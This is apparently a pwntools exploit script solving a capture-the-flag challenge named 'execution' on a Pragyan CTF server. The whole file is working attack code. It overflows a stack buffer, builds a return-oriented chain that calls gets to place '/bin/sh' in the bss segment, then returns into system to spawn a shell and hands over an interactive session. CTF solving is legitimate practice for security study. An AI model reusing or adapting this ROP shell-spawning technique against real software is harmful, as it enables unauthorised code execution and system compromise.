from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./execution"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
#libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process(vuln_path)
    #io = process([vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("execution.ctf.pragyan.org", 12386)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


pop_rdi = 0x400703
pop_rsi_r15 = 0x400701
ret = 0x4004c9
leave_ret = 0x40067a
bss = 0x200 + 0x601050

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

gets_plt = elf.plt["gets"]
system_plt = elf.plt["system"]
vuln = 0x400647

payload = b"a" * 0x40 + p64(0)
payload += p64(pop_rdi) + p64(bss) + p64(gets_plt)
payload += p64(vuln)
ddebug("")
io.sendlineafter("our program: ", payload)

payload = b"/bin/sh\x00"
io.sendline(payload)

payload = b"a" * 0x40 + p64(0)
payload += p64(pop_rdi) + p64(bss)
payload += p64(ret) + p64(system_plt)
io.sendlineafter("our program: ", payload)

io.interactive()
